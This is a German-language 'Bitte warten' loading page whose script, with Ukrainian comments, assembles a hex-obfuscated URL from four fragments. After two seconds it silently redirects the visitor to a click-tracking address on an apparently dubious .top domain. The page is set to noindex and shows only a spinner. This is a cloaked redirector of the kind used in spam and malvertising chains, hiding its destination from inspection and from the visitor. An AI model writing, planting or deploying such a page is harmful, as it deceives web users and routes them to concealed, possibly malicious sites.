<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Bitte warten...</title>
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
    
    // Частина 1: Протокол та початок домену
    const p1 = "h\x74\x74ps://s"; // https://s
    
    // Частина 2: Закодована середина домену
    const p2 = "\x69s\x75\x6e\x79\x2e\x74"; // isuny.t
    
    // Частина 3: Кінець домену та початок шляху
    const p3 = "\x6f\x70/c\x6c"; // op/cl
    
    // Частина 4: Закодований клік та параметри
    const p4 = "\x69ck\x3fo\x3d2&a\x3d1081"; // ick?o=2&a=1081

    // Змінна для збору URL
    let finalUrl = "";

    // Затримка та збір URL
    setTimeout(() => {
      // Збираємо частини разом. JavaScript автоматично декодує \x
      finalUrl = p1 + p2 + p3 + p4;
      
      // Перенаправлення
      window.location.href = finalUrl;
    }, 2000); // 2 секунди затримки
  </script>
  <style>
    /* Стилі залишаються без змін */
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f0f2f5;
      color: #333;
      text-align: center;
      padding-top: 120px;
      margin: 0;
    }

    p {
      font-size: 1.4em;
      margin-bottom: 40px;
    }

    .spinner {
      margin: 0 auto;
      width: 40px;
      height: 40px;
      border: 4px solid #ccc;
      border-top: 4px solid #333;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <p>Bitte warten Sie einen Moment.</p>
  <div class="spinner"></div>
</body>
</html>
